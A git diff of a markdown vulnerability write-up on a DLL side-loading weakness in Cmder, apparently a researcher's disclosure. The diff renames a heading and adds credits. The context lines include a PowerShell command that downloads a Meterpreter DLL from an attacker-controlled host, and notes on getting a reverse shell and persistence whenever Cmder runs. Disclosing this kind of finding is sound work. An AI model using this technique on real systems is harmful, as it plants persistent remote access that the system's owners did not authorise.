@@ -38,7 +38,7 @@ iwr http://kali.space:8000/wow64log.dll -o wow64log.dll
 - From testing your Meterpreter shell will drop you into `C:\Windows` and your pid will be associated to `rundll32.exe`. Your PPID will no longer be running on the system.
 ![image](https://github.com/user-attachments/assets/ef851afc-fae9-43a6-bc10-1c52aa2e3a4a)
 
-## Privilege Escalation
+## Privileges
 - From testing if the Cmder application is run without Administrator permissions you will recieve a shell in the context of your user account.
 - If the Cmder application is run WITH Administrator permissions you will recieve a shell in the context of the Admin privileged account.
 ![image](https://github.com/user-attachments/assets/df922eee-615b-40a2-858f-1e9a1eaed4fd)
@@ -47,4 +47,6 @@ iwr http://kali.space:8000/wow64log.dll -o wow64log.dll
 ## Notes
 - It should be noted that an attacker would require Administrator permissions in order to take advantage of this vulnerability. This is due to the missing DLL being located under `System32`. While this technique does not allow an attacker to priviledge escalate it does provide a potential persistance mechanism. This DLL Side Loading issue allows an attacker to gain code execution anytime the application Cmder is opened.
 - When the Meterpreter `wow64log.dll` is loaded onto the system and the `Cmder` application is run we will get our callback HOWEVER the `Cmder` application will not open.
-- While you have an open shell on the sytem if the `Cmder` application is run again you will not recieve a second shell. However if you were to migrate to a new process and the `Cmder` application were to be run again, you would recieve a second shell. The `Cmder` application will still fail to open as long as your Meterpreter DLL is on the system. 
+- While you have an open shell on the sytem if the `Cmder` application is run again you will not recieve a second shell. However if you were to migrate to a new process and the `Cmder` application were to be run again, you would recieve a second shell. The `Cmder` application will still fail to open as long as your Meterpreter DLL is on the system.
+## Credits 
+- Discovered by ice-wzl in conjunction with Solstice Cyber Solutions
